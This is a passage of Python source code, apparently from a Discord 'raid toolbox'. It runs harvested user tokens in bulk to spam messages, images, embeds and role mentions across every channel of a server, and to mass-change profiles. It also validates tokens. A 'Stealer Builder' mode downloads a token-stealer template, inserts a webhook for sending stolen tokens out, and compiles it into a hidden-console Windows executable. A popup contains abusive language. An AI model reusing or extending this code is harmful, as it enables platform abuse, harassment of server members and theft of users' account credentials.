                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                sys.exit()
    if climode == 0:
        layout = [
              [sg.Text('Text To Spam', size=(15, 1)), sg.InputText(), sg.Checkbox('Ascii?', tooltip='Spam with Ascii instead of text.')],
              [sg.Text('Group ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
             ]
        window = sg.Window('RTB | Group DM Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        text = values[0]
        group = values[2]
        ascii = values[1]
    else:
        text = sys.argv[6]
        group = sys.argv[7]
        if text == "ascii":
            ascii = True
        else:
            ascii = False
    for token in tokenlist:
        executor.submit(sendgdm,token,text,group,ascii)

elif mode == 'imagespam':
    def sendimages(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": 'https://picsum.photos/{}'.format(random.randint(100,2160)),"tts" : false}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
        else:
            while True:
                payload = {"content": 'https://picsum.photos/{}'.format(random.randint(100,2160)),"tts" : false}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    time.sleep(float(ratelimit['retry_after']/1000))
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
    if climode == 0:
        layout = [[sg.Text('This will spam random images from https://picsum.photos/')],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
             ]
        window = sg.Window('RTB | Random Image Spammer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channelid = values[0]
        SERVER = values[1]
    else:
        channelid = sys.argv[6]
        SERVER = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendimages,token,channelid,SERVER)

elif mode == 'gamechange':
    from websocket import create_connection
    def changegame(token,game,type,status):
        if status == "random":
            stat = ['online', 'dnd', 'idle']
            status = random.choice(stat)
        ws = create_connection('wss://gateway.discord.gg/?v=6&encoding=json')
        result = ws.recv()
        if type == "Playing":
            gamejson = {
                "name": game,
                "type": 0
            }
        elif type == 'Streaming':
            gamejson = {
                "name": game,
                "type": 1,
                "url": "https://www.twitch.tv/DEADBREAD'S_RAID_TOOLBOX"
            }
        elif type == "Listening to":
            gamejson = {
                "name": game,
                "type": 2
            }
        elif type == "Watching":
            gamejson = {
                "name": game,
                "type": 3
            }
        payload = {
            'op': 2,
            'd': {
                'token': token,
                'properties': {
                    '$os': sys.platform,
                    '$browser': "Discord{}".format(random.randint(1000,9999)),
                    '$device': "Discord{}".format(random.randint(1000,9999)),
                    '$referrer': '',
                    '$referring_domain': ''
                },
                'compress': True,
                'large_threshold': 250,
                'v': 3,
                "presence": {
                    "game": gamejson,
                    "status": status,
                    "since": random.randint(0,9999),
                    "afk": False
                }
            }
        }
        to_send = json.dumps(payload)
        ws.send(to_send)
    if climode == 0:
        layout = [[sg.Combo(['Playing', 'Streaming', 'Watching', 'Listening to'], size=(10, 1), default_value='Playing', readonly=True), sg.InputText('osu!',size=(10, 1)),sg.Combo(['online', 'dnd', 'idle','random'], size=(10, 1), default_value='online', readonly=True)],
                  [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
                  ]
        window = sg.Window('RTB | Status Changer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        type = values[0]
        game = values[1]
        status = values[2]
    else:
        type = 'Playing'
        game = sys.argv[6]
        status = 'online'
    while True:
        for token in tokenlist:
            executor.submit(changegame,token,game,type,status)
        time.sleep(60)

elif mode == 'nickname':
    def nickname(token,server,name,type):
        headers = {'Authorization': token, 'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if type == "Cycle":
            n = []
            for x in name.rstrip():
                n.append(x)
            cyclename = cycle(n)
            newnick = ''
            while True:
                if len(newnick) == len(name.rstrip()):
                    newnick = ''
                newnick += next(cyclename)
                payload = {'nick': newnick}
                requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
                time.sleep(1)
        elif type == "Ascii":
            while True:
                payload = {'nick': asciigen(32)}
                requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
                time.sleep(2)
        elif type == "Set":
            payload = {'nick': name}
            requests.patch('https://canary.discordapp.com/api/v6/guilds/{}/members/@me/nick'.format(server), headers=headers,json=payload)
    if climode == 0:
        layout = [
                [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
                [sg.Combo(['Cycle','Ascii','Set'], size=(14, 5), default_value='Cycle', readonly=True),sg.InputText("DeadBread's Raid Toolbox", tooltip="New Nickname")],
                [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
                ]
        window = sg.Window('RTB | Nickname Changer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        server = values[0]
        type = values[1]
        name = values[2]
    else:
        server = sys.argv[6]
        type = "Ascii"
        name = "None"
    for token in tokenlist:
        executor.submit(nickname,token,server,name,type)

elif mode == 'embed':
    def embedspam(token,channel,server,title,author,iconurl,field_name,field_value,imgurl,footer):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    payload = {"content": '', "embed":{"title": title,"color": random.randint(1,16777215),"footer": {"icon_url": iconurl,"text": footer},"image": {"url": imgurl},"author": {"name": author,"url": "https://github.com/DeadBread76/Raid-Toolbox","icon_url": iconurl},"fields": [{"name": field_name,"value": field_value}]}}
                    if not channel['type'] == 0:
                        continue
                    else:
                        src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json=payload)
                        if src.status_code == 429:
                            ratelimit = json.loads(src.content)
                            time.sleep(float(ratelimit['retry_after']/1000))
                        elif src.status_code == 401:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
                        elif src.status_code == 404:
                            error = json.loads(src.content)
                            with open('errors.log', 'a') as errorlogging:
                                errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                            sys.exit()
        else:
            while True:
                payload = {"content": '', "embed":{"title": title,"color": random.randint(1,16777215),"footer": {"icon_url": iconurl,"text": footer},"image": {"url": imgurl},"author": {"name": author,"url": "https://github.com/DeadBread76/Raid-Toolbox","icon_url": iconurl},"fields": [{"name": field_name,"value": field_value}]}}
                src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json=payload)
                if src.status_code == 429:
                    ratelimit = json.loads(src.content)
                    time.sleep(float(ratelimit['retry_after']/1000))
                elif src.status_code == 401:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
                elif src.status_code == 404:
                    error = json.loads(src.content)
                    with open('errors.log', 'a') as errorlogging:
                        errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                    sys.exit()
    layout = [
            [sg.Text('Server ID', size=(10, 1)), sg.InputText()],
            [sg.Text('Channel ID', size=(10, 1)), sg.InputText('all')],
            [sg.Text('Title', size=(10, 1)), sg.InputText()],
            [sg.Text('Author', size=(10, 1)), sg.InputText()],
            [sg.Text('Icon URL', size=(10, 1)), sg.InputText()],
            [sg.Text('Field Name', size=(10, 1)), sg.InputText()],
            [sg.Text('Field Value', size=(10, 1)), sg.InputText()],
            [sg.Text('Image URL', size=(10, 1)), sg.InputText()],
            [sg.Text('Footer Text', size=(10, 1)), sg.InputText()],
            [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
            ]
    window = sg.Window('RTB | Embed Spammer', layout, keep_on_top=True)
    event, values = window.Read()
    window.Close()
    if event == "Start":
        pass
    else:
        sys.exit()
    server = values[0]
    channel = values[1]
    title = values[2]
    author = values[3]
    iconurl = values[4]
    field_name = values[5]
    field_value = values[6]
    imgurl = values[7]
    footer = values[8]
    for token in tokenlist:
        executor.submit(embedspam,token,channel,server,title,author,iconurl,field_name,field_value,imgurl,footer)

elif mode == 'avatarchange':
    from base64 import b64encode
    # Ripped from Discord.py
    def get_mime(data):
        if data.startswith(b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A'):
            return 'image/png'
        elif data[6:10] in (b'JFIF', b'Exif'):
            return 'image/jpeg'
        elif data.startswith((b'\x47\x49\x46\x38\x37\x61', b'\x47\x49\x46\x38\x39\x61')):
            return 'image/gif'
        elif data.startswith(b'RIFF') and data[8:12] == b'WEBP':
            return 'image/webp'
    # Ripped from Discord.py
    def bytes_to_base64_data(data):
        fmt = 'data:{mime};base64,{data}'
        mime = get_mime(data)
        b64 = b64encode(data).decode('ascii')
        return fmt.format(mime=mime, data=b64)

    def changeavatar(token,avatarfile):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        src = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        response = json.loads(src.content.decode())
        username = response['username']
        email = response['email']
        with open(avatarfile, "rb") as avatar_handle:
            encoded = bytes_to_base64_data(avatar_handle.read())
        payload = {'avatar': encoded, 'email': email, 'password': "", 'username': username}
        src = requests.patch('https://canary.discordapp.com/api/v6/users/@me', headers=headers, json=payload)
    layout = [
            [sg.Text('Single Avatar',size=(20,1)), sg.Input(), sg.FileBrowse(button_color=theme['button_colour'], file_types=(("PNG Files", "*.png"),("JPG Files", "*.jpg"),("JPEG Files", "*.jpeg"),("GIF Files", "*.gif"),("WEBM Files", "*.webm")))],
            [sg.Text('Random Avatars (Folder)',size=(20,1)), sg.Input(), sg.FolderBrowse(button_color=theme['button_colour'])],
            [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1)), sg.Checkbox('Use Single'), sg.Checkbox('Use Random (Folder)')]
            ]
    window = sg.Window('RTB | Avatar Changer', layout, keep_on_top=True)
    event, values = window.Read()
    window.Close()
    if event == "Start":
        pass
    else:
        sys.exit()
    avatarfile = values[0]
    avatarfolder = values[1]
    usesingle = values[2]
    usemultiple = values[3]
    if usesingle and usemultiple == True:
        sg.Popup("What one will it be you stupid cunt you can't have both.",title="w0t")
        sys.exit()
    if usesingle:
        for token in tokenlist:
            executor.submit(changeavatar,token,avatarfile)
    elif usemultiple:
        files = os.listdir(avatarfolder)
        for token in tokenlist:
            avatarfile = avatarfolder + "/" + random.choice(files)
            executor.submit(changeavatar,token,avatarfile)

elif mode == "rolemention":
    def sendrolemention(token,channel,server):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        rolelist = []
        msg = ''
        roles = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/roles".format(server),headers=headers).text
        rolejson = json.loads(roles)
        for role in rolejson:
            rolelist.append("<@&{}>".format(role['id']))
        for role in rolelist:
            msg += role + ' '
        if channel == 'all':
            chanjson = requests.get("https://canary.discordapp.com/api/v6/guilds/{}/channels".format(server),headers=headers).text
            channellist = json.loads(chanjson)
            while True:
                for channel in channellist:
                    if not channel['type'] == 0:
                        continue
                    else:
                        for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                            src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel['id']), headers=headers, json={"content" : m,"tts" : false})
                            if src.status_code == 429:
                                ratelimit = json.loads(src.content)
                                time.sleep(float(ratelimit['retry_after']/1000))
                            elif src.status_code == 401:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()
                            elif src.status_code == 404:
                                error = json.loads(src.content)
                                with open('errors.log', 'a') as errorlogging:
                                    errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                                sys.exit()
        else:
            headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
            while True:
                for m in [msg[i:i+1999] for i in range(0, len(msg), 1999)]:
                    src = requests.post("https://canary.discordapp.com/api/v6/channels/{}/messages".format(channel), headers=headers, json={"content": m, "tts": false})
                    if src.status_code == 429:
                        ratelimit = json.loads(src.content)
                        time.sleep(float(ratelimit['retry_after']/1000))
                    elif src.status_code == 401:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
                    elif src.status_code == 404:
                        error = json.loads(src.content)
                        with open('errors.log', 'a') as errorlogging:
                            errorlogging.write("Token {} Error: {} (Code {})\n".format(token[:24],error['message'],error['code']))
                        sys.exit()
    if climode == 0:
        layout = [
              [sg.Text('Server ID', size=(15, 1)), sg.InputText()],
              [sg.Text('Channel ID', size=(15, 1)), sg.InputText('all')],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
              ]
        window = sg.Window('RTB | Role Mass Mentioner', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        SERVER = values[0]
        channelid = values[1]
    else:
        SERVER = sys.argv[6]
        channelid = sys.argv[7]
    for token in tokenlist:
        executor.submit(sendrolemention,token,channelid,SERVER)

elif mode == "cleanup":
    if climode == 0:
        layout = [
              [sg.Text('Enter A Server ID to delete all the messages in all channels sent by the token.')],
              [sg.InputText()],
              [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
             ]
        window = sg.Window('RTB | Server Cleanup', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        server = values[0]
    else:
        server = sys.argv[6]
    for token in tokenlist:
        subprocess.Popen([pycommand,'RTBFiles/cleanup.py',token,server,str(os.getpid()),'None'])
    while True:
        pass

elif mode == "hypesquad":
    def changehouse(token,house):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if house == "Bravery":
            payload = {'house_id': 1}
        elif house == "Brilliance":
            payload = {'house_id': 2}
        elif house == "Balance":
            payload = {'house_id': 3}
        elif house == "Random":
            houses = [1, 2, 3]
            payload = {'house_id': random.choice(houses)}
        requests.post('https://discordapp.com/api/v6/hypesquad/online',headers=headers,json=payload)
    if climode == 0:
        layout = [
                 [sg.Text('House To Change to', size=(15, 1)),sg.Combo(['Bravery','Brilliance','Balance','Random'],readonly=True, default_value='Bravery')],
                 [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
                ]
        window = sg.Window('RTB | HypeSquad House Changer', layout, keep_on_top=True)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        house = values[0]
    else:
        house = sys.argv[6]
    for token in tokenlist:
        executor.submit(changehouse,token,house)

elif mode == "reaction":
    import emoji
    def addreact(token,emoji,message,channel,type):
        headers = {'Authorization': token, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'}
        if type == "Add":
            requests.put("https://discordapp.com/api/v6/channels/{}/messages/{}/reactions/{}/@me".format(channel,message,emoji), headers=headers)
        elif type == "Remove":
            requests.delete("https://discordapp.com/api/v6/channels/{}/messages/{}/reactions/{}/@me".format(channel,message,emoji), headers=headers)
    if climode == 0:
        layout = [
                [sg.Text('Channel ID', size=(15, 1)), sg.InputText()],
                [sg.Text('Message ID', size=(15, 1)), sg.InputText()],
                [sg.Combo(['Add','Remove'],default_value='Add',readonly=True,size=(14,1)), sg.InputText(":thumbsup:",size=(10,1))],
                [sg.RButton('Start',button_color=theme['button_colour'],size=(10,1))]
                ]
        window = sg.Window('RTB | Message Reactor', layout)
        event, values = window.Read()
        window.Close()
        if event == "Start":
            pass
        else:
            sys.exit()
        channel = values[0]
        message = values[1]
        type = values[2]
        emoji = emoji.emojize(values[3].rstrip(), use_aliases=True)
    else:
        message = sys.argv[6]
        channel = sys.argv[7]
        type = sys.argv[8]
        emoji = emoji.emojize(sys.argv[8].rstrip(), use_aliases=True)
    for token in tokenlist:
        executor.submit(addreact,token,emoji,message,channel,type)

elif mode == 'quickcheck':
    from colorama import init
    from termcolor import colored
    init()
    token = sys.argv[6]
    apilink = 'https://discordapp.com/api/v6/users/@me'
    headers = {'Authorization': token, 'Content-Type': 'application/json'}
    src = requests.get(apilink, headers=headers)
    if "401: Unauthorized" in str(src.content):
        print(colored(token + " Invalid","red"))
    else:
        response = json.loads(src.content.decode())
        if response["verified"]:
            print(colored(token + " Valid","green"))
            with open ("quick_checked_tokens_verified.txt", "a+") as handle:
                handle.write(token+"\n")
        else:
            print(colored(token + " Unverified","yellow"))
            with open ("quick_checked_tokens_unverified.txt", "a+") as handle:
                handle.write(token+"\n")

elif mode == "StealerBuilder":
    if not sys.platform.startswith("win32"):
        sg.Popup("Only Supported on windows as of now. Sorry.", title="Yikes")
        os.kill(os.getpid(), 15)
    if not os.path.exists("RTBStealerBuilder/"):
        os.mkdir("RTBStealerBuilder/")
    def build():
        global name
        global webhook
        global useicon
        global icon
        global Window
        os.chdir('RTBStealerBuilder/')
        pyname = name+'.py'
        temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/2eb4210c0fa37a5f0bc2462c0a960fe6eaf2e307/stealertemplate.py").text
        with open("template.py", "w+") as handle:
            handle.write(temp)
        with open("template.py") as f:
            lines = f.readlines()
        os.remove("template.py")
        with open(pyname, "w") as f:
            lines.insert(12, "webhook = '{}'\n".format(webhook))
            f.write("".join(lines))
        print("Building EXE, Please wait...")
        window.Refresh()
        if useicon:
            compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'--icon='+icon,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
        else:
            compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
        compiling.wait()
        print("EXE built, Cleaning up...")
        window.Refresh()
        shutil.rmtree('build')
        for root, dirs, files in os.walk('dist'):
            for file in files:
                if file == ('{}.exe'.format(name)):
                    os.rename('dist/{}'.format(file), '{}.exe.'.format(name))
        shutil.rmtree('dist')
        os.remove('{}.spec'.format(name))
        print("Finished!")
        window.Refresh()
    layout = [
            [sg.Text('Output Name', size=(10, 1)), sg.Input(size=(10, 1))],
            [sg.Text('Webhook', size=(10, 1)), sg.Input(size=(50, 1)), sg.Checkbox('Use Icon?')],
            [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1)), sg.FileBrowse(button_color=theme['button_colour'])],
            [sg.Output(size=(80, 20))],
            [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
            ]
    window = sg.Window("DeadBread's Token Stealer Builder v 0.1.1", layout)

    while True:
        event, values = window.Read()
        if event is None or event == 'Exit':
            break
        if event == "Build":
            if values[0] == '':
                sg.PopupNonBlocking('Invalid Name!')
                continue
            if values[1] == '':
                sg.PopupNonBlocking('No webhook entered!')
                continue
            name = values[0]
            webhook = base64.b64encode(values[1].encode()).decode()
            useicon = values[2]
            icon = values[3]
            build()
    window.Close()


elif mode == 'ree':
    picdata = requests.get("https://gist.githubusercontent.com/DeadBread76/3d93e55fe4a9e4c7324c2f0b13cf24ac/raw/7d433bb5187c5d2c1fc74c310ff0638790491c87/Special%2520surprise.txt")
    pic = picdata.content
    while True:
        try:
            sg.PopupAnimated(pic, background_color='black', time_between_frames=40)
        except Exception:
            pass
